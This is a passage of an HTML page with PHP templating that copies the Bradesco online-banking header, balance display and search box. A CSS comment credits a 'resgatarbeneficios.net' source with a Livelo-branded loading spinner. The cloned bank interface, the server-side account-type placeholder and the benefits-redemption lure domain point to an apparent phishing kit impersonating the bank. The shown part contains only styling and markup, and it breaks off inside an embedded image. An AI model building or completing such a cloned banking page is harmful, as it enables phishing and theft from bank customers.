        .top-bar.universitario header brad-dados-cliente .usuario .saldo-disponivel p {
            color: rgb(255, 255, 255);
        }

        .top-bar.universitario header brad-dados-cliente .usuario .saldo-disponivel p span.moeda {
            color: rgb(255, 255, 255) !important;
        }

        .top-bar.universitario header brad-dados-cliente .usuario .dados-conta h4 {
            color: rgb(255, 255, 255);
        }

        .top-bar.universitario header brad-dados-cliente .usuario .dados-conta p {
            color: rgba(255, 255, 255, 0.7);
        }

        .top-bar.universitario header .sessao span {
            color: rgb(255, 255, 255);
        }

        .top-bar.universitario header .sessao svg circle {
            stroke: rgb(121, 76, 202);
        }

        .top-bar.universitario header .sessao svg circle.remaining {
            stroke: rgb(255, 255, 255);
        }

        .top-bar.universitario header .sessao svg circle.bkg {
            fill: rgb(108, 59, 142);
        }

        .top-bar.universitario header .logout button {
            color: rgb(255, 255, 255);
        }

        .top-bar.click-conta {
            font-family: Montserrat, sans-serif;
            background-image: linear-gradient(90deg, rgb(202, 127, 157) 4%, rgb(113, 35, 61) 88%);
        }

        .top-bar.click-conta header .logo {
            background-image:
                /*savepage-url=bradesco-clickconta.png*/
                url();
            background-repeat: no-repeat;
            background-position: center center;
            width: 77px;
            height: 56px;
            top: 16px;
        }

        .top-bar.click-conta header .data {
            color: rgb(255, 255, 255);
            margin-left: 97px;
        }

        .top-bar.click-conta header brad-dados-cliente .usuario span.separator {
            background-color: rgba(255, 255, 255, 0.3);
        }

        .top-bar.click-conta header brad-dados-cliente .usuario .saldo-disponivel h5 {
            color: rgba(255, 255, 255, 0.7);
        }

        .top-bar.click-conta header brad-dados-cliente .usuario .saldo-disponivel p {
            color: rgb(255, 255, 255);
        }

        .top-bar.click-conta header brad-dados-cliente .usuario .saldo-disponivel p span.moeda {
            color: rgb(255, 255, 255) !important;
        }

        .top-bar.click-conta header brad-dados-cliente .usuario .dados-conta h4 {
            color: rgb(255, 255, 255);
        }

        .top-bar.click-conta header brad-dados-cliente .usuario .dados-conta p {
            color: rgba(255, 255, 255, 0.7);
        }

        .top-bar.click-conta header .sessao span {
            color: rgb(255, 255, 255);
        }

        .top-bar.click-conta header .sessao svg circle {
            stroke: rgb(184, 108, 137);
        }

        .top-bar.click-conta header .sessao svg circle.remaining {
            stroke: rgb(255, 255, 255);
        }

        .top-bar.click-conta header .sessao svg circle.bkg {
            fill: rgb(121, 60, 82);
        }

        .top-bar.click-conta header .logout button {
            color: rgb(255, 255, 255);
        }

        .top-bar.exclusive {
            font-family: Montserrat, sans-serif;
            background-image: linear-gradient(90deg, rgb(112, 47, 138) 0px, rgb(112, 47, 138) 79%, rgb(204, 9, 47) 100%);
        }

        .top-bar.exclusive header .logo {
            background-image: url('images/bradesco-exclusive.png');
            background-repeat: no-repeat;
            background-position: center center;
            width: 118px;
            height: 42px;
            top: 16px;
        }

        .top-bar.exclusive header .data {
            color: rgb(255, 255, 255);
            margin-left: 138px;
        }

        .top-bar.exclusive header brad-dados-cliente .usuario span.separator {
            background-color: rgba(255, 255, 255, 0.3);
        }

        .top-bar.exclusive header brad-dados-cliente .usuario .saldo-disponivel h5 {
            color: rgba(255, 255, 255, 0.7);
        }

        .top-bar.exclusive header brad-dados-cliente .usuario .saldo-disponivel p {
            color: rgb(255, 255, 255);
        }

        .top-bar.exclusive header brad-dados-cliente .usuario .saldo-disponivel p span.moeda {
            color: rgb(255, 255, 255) !important;
        }

        .top-bar.exclusive header brad-dados-cliente .usuario .dados-conta h4 {
            color: rgb(255, 255, 255);
        }

        .top-bar.exclusive header brad-dados-cliente .usuario .dados-conta p {
            color: rgba(255, 255, 255, 0.7);
        }

        .top-bar.exclusive header .sessao span {
            color: rgb(255, 255, 255);
        }

        .top-bar.exclusive header .sessao svg circle {
            stroke: rgb(204, 97, 164);
        }

        .top-bar.exclusive header .sessao svg circle.remaining {
            stroke: rgb(243, 199, 227);
        }

        .top-bar.exclusive header .sessao svg circle.bkg {
            fill: rgb(127, 20, 87);
        }

        .top-bar.exclusive header .logout button {
            color: rgb(255, 255, 255);
        }

        .top-bar.exclusive>* {
            z-index: 2;
        }

        .top-bar.exclusive::before {
            content: "";
            display: block;
            position: absolute;
            right: calc(100% - 100px);
            top: 0px;
            width: 100%;
            height: 100%;
            background-color: rgb(185, 151, 91);
            z-index: 1;
        }

        .top-bar.exclusive::after {
            content: "";
            display: block;
            position: absolute;
            left: 100px;
            top: 0px;
            width: 153px;
            height: 100%;
            z-index: 1;
            background-image: url('images/box-exclusive.svg');
            background-repeat: no-repeat;
            background-position: left top;
            background-size: cover;
        }

        .top-bar.exclusive .logo {
            z-index: 10;
        }

        .top-bar.exclusive .data {
            margin-left: 158px !important;
        }

        .top-bar header.mobile {
            display: flex;
            resize: horizontal;
            width: auto;
            min-width: initial;
            height: 56px;
            padding: 0px;
        }

        .top-bar header.mobile>div {
            flex: unset;
        }

        .top-bar header.mobile.ios {
            height: 44px;
        }

        .top-bar header.mobile.ios .photo {}

        .top-bar header.mobile.ios h1 {
            text-align: center;
            line-height: 44px;
        }

        .top-bar header.mobile .back {
            float: left;
            padding: 0px 16px;
            margin-right: 8px;
            color: rgb(250, 250, 250);
            border: none;
            background-color: transparent;
            height: 100%;
        }

        .top-bar header.mobile .menu-icon {
            flex-grow: 0;
            flex-shrink: 0;
            min-width: 45px;
        }

        .top-bar header.mobile .nome-rota {
            padding: 0px;
            text-align: center;
            width: 100%;
        }

        .top-bar header.mobile .nome-rota h1 {
            font-size: 0.8rem;
        }

        .top-bar header.mobile .photo {
            flex: 0 0 15%;
            width: 32px;
            height: 32px;
            transform: translateY(-50%);
            border-radius: 50%;
            overflow: hidden;
        }

        .top-bar header.mobile h1 {
            overflow: hidden;
            color: rgb(250, 250, 250);
            font-size: 1rem;
            font-weight: 500;
            vertical-align: middle;
            margin: 0px;
        }
    </style>

    <style>
        /*! CSS Used from: https://resgatarbeneficios.net/xm663bc9a92c5cb/public/css/spinner.css */
        #livelo-spinner {
            position: fixed;
            width: 100%;
            height: 100%;
            left: 0;
            top: 0;
            z-index: 1100;
            display: none;
        }

        #livelo-spinner .loader {
            position: absolute;
            top: 50%;
            left: 50%;
            width: 120px;
            height: 120px;
            border-radius: 50%;
            -webkit-perspective: 800px;
            perspective: 800px;
            -webkit-transform: translate(-50%, -50%) rotate(25deg);
            transform: translate(-50%, -50%) rotate(25deg);
        }

        #livelo-spinner .loader::before {
            content: "";
            position: absolute;
            left: 50%;
            top: 50%;
            -webkit-transform: translate(-50%, -50%) rotate(-25deg);
            transform: translate(-50%, -50%) rotate(-25deg);
            width: 70px;
            height: 100%;
            background: url(./images/favicon.livelop.png) center center no-repeat;
            background-size: contain;
        }

        #livelo-spinner .inner {
            position: absolute;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            width: 100%;
            height: 100%;
            border-radius: 50%;
        }

        #livelo-spinner .inner.one {
            left: 0%;
            top: 0%;
            -webkit-animation: rotate-one 1s linear infinite;
            animation: rotate-one 1s linear infinite;
            border-bottom: 3px solid #ea0480;
        }

        #livelo-spinner .inner.two {
            right: 0%;
            top: 0%;
            -webkit-animation: rotate-two 1s linear infinite;
            animation: rotate-two 1s linear infinite;
            border-right: 3px solid #242284;
        }

        #livelo-spinner .inner.three {
            right: 0%;
            bottom: 0%;
            -webkit-animation: rotate-three 1s linear infinite;
            animation: rotate-three 1s linear infinite;
            border-top: 3px solid #751682;
        }

        /*! CSS Used keyframes */
        @-webkit-keyframes rotate-one {
            0% {
                -webkit-transform: rotateX(35deg) rotateY(-45deg) rotateZ(0deg);
                transform: rotateX(35deg) rotateY(-45deg) rotateZ(0deg);
            }

            100% {
                -webkit-transform: rotateX(35deg) rotateY(-45deg) rotateZ(360deg);
                transform: rotateX(35deg) rotateY(-45deg) rotateZ(360deg);
            }
        }

        @keyframes rotate-one {
            0% {
                -webkit-transform: rotateX(35deg) rotateY(-45deg) rotateZ(0deg);
                transform: rotateX(35deg) rotateY(-45deg) rotateZ(0deg);
            }

            100% {
                -webkit-transform: rotateX(35deg) rotateY(-45deg) rotateZ(360deg);
                transform: rotateX(35deg) rotateY(-45deg) rotateZ(360deg);
            }
        }

        @-webkit-keyframes rotate-two {
            0% {
                -webkit-transform: rotateX(50deg) rotateY(10deg) rotateZ(0deg);
                transform: rotateX(50deg) rotateY(10deg) rotateZ(0deg);
            }

            100% {
                -webkit-transform: rotateX(50deg) rotateY(10deg) rotateZ(360deg);
                transform: rotateX(50deg) rotateY(10deg) rotateZ(360deg);
            }
        }

        @keyframes rotate-two {
            0% {
                -webkit-transform: rotateX(50deg) rotateY(10deg) rotateZ(0deg);
                transform: rotateX(50deg) rotateY(10deg) rotateZ(0deg);
            }

            100% {
                -webkit-transform: rotateX(50deg) rotateY(10deg) rotateZ(360deg);
                transform: rotateX(50deg) rotateY(10deg) rotateZ(360deg);
            }
        }

        @-webkit-keyframes rotate-three {
            0% {
                -webkit-transform: rotateX(35deg) rotateY(55deg) rotateZ(0deg);
                transform: rotateX(35deg) rotateY(55deg) rotateZ(0deg);
            }

            100% {
                -webkit-transform: rotateX(35deg) rotateY(55deg) rotateZ(360deg);
                transform: rotateX(35deg) rotateY(55deg) rotateZ(360deg);
            }
        }

        @keyframes rotate-three {
            0% {
                -webkit-transform: rotateX(35deg) rotateY(55deg) rotateZ(0deg);
                transform: rotateX(35deg) rotateY(55deg) rotateZ(0deg);
            }

            100% {
                -webkit-transform: rotateX(35deg) rotateY(55deg) rotateZ(360deg);
                transform: rotateX(35deg) rotateY(55deg) rotateZ(360deg);
            }
        }
    </style>
</head>

<body style="padding-top: 158px; overflow: hidden;">
    <brad-root _nghost-xfy-c0="" ng-version="7.2.16">
        <brad-header _ngcontent-xfy-c0="">


            <div class="top-bar <?php print $tipo; ?>">
                <header>
                    <div>
                        <div class="logo">
                            <h1 draggable="false">Bradesco classic</h1>
                        </div>
                        <!---->
                        <div class="data"><span></span></div>
                    </div>
                    <div>
                        <!---->
                        <brad-busca _nghost-xfy-c5="">
                            <div _ngcontent-xfy-c5="" class="busca-container">
                                <div _ngcontent-xfy-c5="" class="busca">
                                    <label _ngcontent-xfy-c5="" for="busca">Buscar</label><input _ngcontent-xfy-c5="" id="busca" name="busca" placeholder="Buscar" tabindex="1" title="Informe o conteúdo da pesquisa" type="text" class="ng-untouched ng-pristine ng-valid" value="">
                                    <button _ngcontent-xfy-c5="" tabindex="-1" title="Botão Buscar" type="button">
                                        <i _ngcontent-xfy-c5="" class="ico">
                                            <svg _ngcontent-xfy-c5="" xmlns:xlink="http://www.w3.org/1999/xlink" height="13" version="1.1" viewBox="0 0 12.75 12.75" width="13" xmlns="http://www.w3.org/2000/svg">
                                                <path _ngcontent-xfy-c5="" d="M9.21841967,8.6873861 L12.6401923,12.1098622 C12.7866239,12.2563239 12.7865994,12.4937607 12.6401378,12.6401923 C12.4936761,12.7866239 12.2562393,12.7865994 12.1098077,12.6401378 L8.68813965,9.21776627 C7.76705544,10.0165869 6.565007,10.5 5.25,10.5 C2.35039322,10.5 0,8.14960678 0,5.25 C0,2.35039322 2.35039322,0 5.25,0 C8.14960678,0 10.5,2.35039322 10.5,5.25 C10.5,6.56464842 10.0168505,7.76639987 9.21841967,8.6873861 Z M0.75,5.25 C0.75,7.73539322 2.76460678,9.75 5.25,9.75 C7.73539322,9.75 9.75,7.73539322 9.75,5.25 C9.75,2.76460678 7.73539322,0.75 5.25,0.75 C2.76460678,0.75 0.75,2.76460678 0.75,5.25 Z" fill="#ffffff" id="path-1"></path>
                                            </svg>
                                        </i>
                                    </button>
                                </div>
                                <!---->
                                <div _ngcontent-xfy-c5="" class="resultados-sugeridos">
                                    <ul _ngcontent-xfy-c5="">
                                        <!---->
                                    </ul>
                                    <!---->
                                </div>
                            </div>
                        </brad-busca>
                    </div>
                    <div>
                        <!---->
                        <brad-dados-cliente _nghost-xfy-c6="">
                            <div _ngcontent-xfy-c6="" class="usuario">
                                <div _ngcontent-xfy-c6="" class="saldo-disponivel">
                                    <span _ngcontent-xfy-c6="" class="click">
                                        <p _ngcontent-xfy-c6="" class="saldo">Saldo disponível</p>
                                        <span _ngcontent-xfy-c6="" class="arrow ">
                                            <svg _ngcontent-xfy-c6="" xmlns:xlink="http://www.w3.org/1999/xlink" height="20" viewBox="-5 -2 22 22" width="25" xmlns="http://www.w3.org/2000/svg">
                                                <path _ngcontent-xfy-c6="" d="M5.5 12.747l7.626-8.58a.5.5 0 1 1 .748.665l-8 9a.5.5 0 0 1-.748 0l-8-9a.5.5 0 1 1 .748-.664l7.626 8.58z" fill="#fff" id="a"></path>
                                            </svg>
                                        </span>
                                    </span>
                                    <!----><!---->
                                    <span _ngcontent-xfy-c6="" class="saldo-refresh pointer">
                                        <svg _ngcontent-xfy-c6="" xmlns:xlink="http://www.w3.org/1999/xlink" height="1600" viewBox="0 0 1600 1600" width="1600" xmlns="http://www.w3.org/2000/svg">
                                            <image _ngcontent-xfy-c6="" xlink:href="data:img/png;base64,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